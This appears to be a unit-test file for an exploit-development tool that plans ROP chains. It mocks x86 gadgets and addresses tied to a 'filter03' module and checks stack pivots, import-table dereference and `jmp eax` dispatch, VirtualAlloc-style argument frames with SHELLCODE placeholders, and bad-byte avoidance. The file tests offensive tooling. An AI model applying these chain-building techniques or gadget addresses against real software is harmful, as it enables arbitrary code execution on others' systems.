import { describe, expect, it } from "vitest";
import { planSlotDispatch } from "../src/rop/slot_dispatch";
import type { CapabilityIndex } from "../src/rop/capabilities";
import type { RopGadget } from "../src/rop/types";

function insn(mnemonic: string, operands: string[]) {
  return { mnemonic, operands };
}

function inferCaps(instructions: Array<{ mnemonic: string; operands: string[] }>) {
  const caps: Array<Record<string, string>> = [];
  for (const i of instructions) {
    const m = i.mnemonic.toLowerCase();
    const d = i.operands[0]?.trim().toLowerCase();
    if (!d) continue;
    if (m === "pop") caps.push({ kind: "LOAD_REGISTER", register: d, evidence: "mock" });
    else if (m === "add" && !d.startsWith("[")) caps.push({ kind: "REGISTER_ADD", register: d, targetRegister: i.operands[1]?.trim().toLowerCase() ?? "", evidence: "mock" });
    else if (m === "jmp") caps.push({ kind: "DISPATCH_JMP_REGISTER", register: d, evidence: "mock" });
  }
  return caps.length ? caps : [{ kind: "NONE", evidence: "mock" }];
}

function g(instructions: Array<{ mnemonic: string; operands: string[] }>, address: number): RopGadget {
  return {
    schemaVersion: "v1",
    canonicalId: `mock_${address}`,
    instructions,
    locations: [{ module: "test", virtualAddress: address, executable: true }],
    semanticSummary: { instructions: [], effects: [], unknowns: [], netTransform: {} },
    categories: [],
    score: 50,
    scoreReasons: [],
    classificationReasons: [],
    capabilities: inferCaps(instructions),
  } as unknown as RopGadget;
}

function index(gadgets: RopGadget[]): CapabilityIndex {
  const capabilityMap = new Map<string, RopGadget[]>();
  for (const gadget of gadgets) {
    for (const cap of gadget.capabilities) {
      const key = [cap.kind, cap.register ?? "", cap.targetRegister ?? ""].join(":");
      const arr = capabilityMap.get(key) ?? [];
      arr.push(gadget);
      capabilityMap.set(key, arr);
    }
  }
  return {
    gadgets,
    capabilityMap,
    loadRegister: () => [],
    zeroRegister: () => [],
    moveIntoRegister: () => [],
    exchangeWithRegister: () => [],
    stackPivotCandidates: () => [],
    memoryReadCandidates: () => [],
    memoryWriteCandidates: () => [],
    query: () => [],
  };
}

// The Mini-stream / filter03 register topology: deref only lands in eax, eax is a
// sink (no move/push out), but `jmp eax` exists.
const core = [
  g([insn("pop", ["eax"]), insn("ret", [])], 0x100115aa),
  g([insn("pop", ["ecx"]), insn("ret", [])], 0x10011002),
  g([insn("mov", ["dword ptr [eax]", "ecx"]), insn("ret", [])], 0x10010e83),
  g([insn("add", ["eax", "0x4"]), insn("ret", [])], 0x100192dc),
  g([insn("xchg", ["eax", "esp"]), insn("ret", [])], 0x1002fe81),
  g([insn("mov", ["eax", "[eax]"]), insn("ret", [])], 0x10027f59),
  g([insn("jmp", ["eax"])], 0x100371e9),
  // a scratch for null construction
  g([insn("pop", ["edx"]), insn("ret", [])], 0x10011006),
  g([insn("add", ["ecx", "edx"]), insn("ret", [])], 0x10011007),
];

describe("slot dispatch (deref IAT + jmp eax)", () => {
  it("emits the deref preamble as data and dispatches through the slot", () => {
    const plan = planSlotDispatch(
      index(core),
      { value: 0x00420000 },
      0x1005d060,
      [
        { placeholder: "SHELLCODE", comment: "VA return -> shellcode" },
        { placeholder: "SHELLCODE", comment: "lpAddress" },
        { value: 0x11111111, comment: "dwSize" },
        { value: 0x22222222, comment: "flAllocationType" },
        { value: 0x33333333, comment: "flProtect" },
      ],
      [],
    );
    expect(plan.success).toBe(true);
    expect(plan.dispatch.popPtr).toBe(0x100115aan);
    expect(plan.dispatch.deref).toBe(0x10027f59n);
    expect(plan.dispatch.jmp).toBe(0x100371e9n);
    expect(plan.dispatch.ptrReg).toBe("eax");
    expect(plan.dispatch.valReg).toBe("eax");
    // The slot value is written as a plain data word (popped into ecx and stored),
    // never dereferenced at build time.
    expect(plan.steps.some((s) => s.value === 0x1005d060)).toBe(true);
    // The three preamble gadget addresses appear as data words in the frame.
    for (const addr of [0x100115aa, 0x10027f59, 0x100371e9]) {
      expect(plan.steps.some((s) => s.value === addr)).toBe(true);
    }
  });

  it("synthesises null args instead of placing them raw", () => {
    const plan = planSlotDispatch(
      index(core),
      { value: 0x00420000 },
      0x1005d060,
      [
        { placeholder: "SHELLCODE", comment: "VA return" },
        { placeholder: "SHELLCODE", comment: "lpAddress" },
        { value: 0x00001000, comment: "dwSize" },
        { value: 0x00001000, comment: "MEM_COMMIT" },
        { value: 0x00000040, comment: "flProtect" },
      ],
      [0x00, 0x0a, 0x0d],
    );
    expect(plan.success).toBe(true);
    // no null-bearing arg placed as a literal payload word
    const literals = plan.steps.filter((s) => s.kind === "value" && s.value !== undefined).map((s) => s.value!);
    expect(literals).not.toContain(0x00001000);
    expect(literals).not.toContain(0x00000040);
  });

  it("reports the missing dispatch primitive instead of half a chain", () => {
    const noJmp = core.filter((x) => x.canonicalId !== "mock_268661225"); // drop jmp eax (0x100371e9)
    const plan = planSlotDispatch(index(noJmp), { value: 0x00420000 }, 0x1005d060, [{ placeholder: "SC", comment: "ret" }], []);
    expect(plan.success).toBe(false);
    expect(plan.unsatisfied.some((u) => u.includes("jmp <reg>"))).toBe(true);
    expect(plan.steps).toHaveLength(0);
  });

  it("flags a non-stable preamble gadget", () => {
    // Move jmp eax into a relocating module address (outside the stable range).
    const relocated = core.map((x) =>
      x.canonicalId === "mock_268661225"
        ? g([insn("jmp", ["eax"])], 0x03d371e9)
        : x);
    // filter03's stable range; the relocated jmp eax at 0x03Dxxxxx falls outside it.
    const stable = (a: bigint) => a >= 0x10000000n && a < 0x10060000n;
    const plan = planSlotDispatch(index(relocated), { value: 0x00420000 }, 0x1005d060, [{ placeholder: "SC", comment: "ret" }], [], stable);
    // still builds, but warns
    expect(plan.dispatch.jmp).toBe(0x03d371e9n);
    expect(plan.dispatch.unstable.some((u) => u.includes("jmp eax"))).toBe(true);
  });

  it("composes the deref/dispatch through a non-eax register (universal)", () => {
    // A corpus with NO eax deref chain — everything runs through ebx.
    const ebxIdx = index([
      g([insn("pop", ["ebx"]), insn("ret", [])], 0x10011111),
      g([insn("mov", ["ebx", "[ebx]"]), insn("ret", [])], 0x10022222), // mov ebx,[ebx]
      g([insn("jmp", ["ebx"])], 0x10033333),
      // frame-write machinery (still eax-cursor based)
      g([insn("pop", ["eax"]), insn("ret", [])], 0x10044444),
      g([insn("pop", ["ecx"]), insn("ret", [])], 0x10055555),
      g([insn("mov", ["dword ptr [eax]", "ecx"]), insn("ret", [])], 0x10066666),
      g([insn("add", ["eax", "0x4"]), insn("ret", [])], 0x10077777),
      g([insn("xchg", ["eax", "esp"]), insn("ret", [])], 0x10088888),
    ]);
    const plan = planSlotDispatch(ebxIdx, { value: 0x00420000 }, 0x1005d060,
      [{ placeholder: "SC", comment: "ret" }, { value: 0x11111111, comment: "a1" }], []);
    expect(plan.success).toBe(true);
    expect(plan.dispatch.ptrReg).toBe("ebx");
    expect(plan.dispatch.valReg).toBe("ebx");
    expect(plan.dispatch.jmp).toBe(0x10033333n);
    // the ebx preamble addresses ride as data words
    for (const addr of [0x10011111, 0x10022222, 0x10033333]) {
      expect(plan.steps.some((s) => s.value === addr)).toBe(true);
    }
  });

  it("composes a two-register split deref (mov val,[ptr] with val != ptr)", () => {
    const splitIdx = index([
      g([insn("pop", ["eax"]), insn("ret", [])], 0x10011111), // ptr = eax
      g([insn("mov", ["ecx", "[eax]"]), insn("ret", [])], 0x10022222), // val = ecx from [eax]
      g([insn("jmp", ["ecx"])], 0x10033333),
      g([insn("pop", ["ecx"]), insn("ret", [])], 0x10055555),
      g([insn("mov", ["dword ptr [eax]", "ecx"]), insn("ret", [])], 0x10066666),
      g([insn("add", ["eax", "0x4"]), insn("ret", [])], 0x10077777),
      g([insn("xchg", ["eax", "esp"]), insn("ret", [])], 0x10088888),
    ]);
    const plan = planSlotDispatch(splitIdx, { value: 0x00420000 }, 0x1005d060,
      [{ placeholder: "SC", comment: "ret" }], []);
    expect(plan.success).toBe(true);
    expect(plan.dispatch.ptrReg).toBe("eax");
    expect(plan.dispatch.valReg).toBe("ecx");
    expect(plan.dispatch.deref).toBe(0x10022222n);
    expect(plan.dispatch.jmp).toBe(0x10033333n);
  });
});
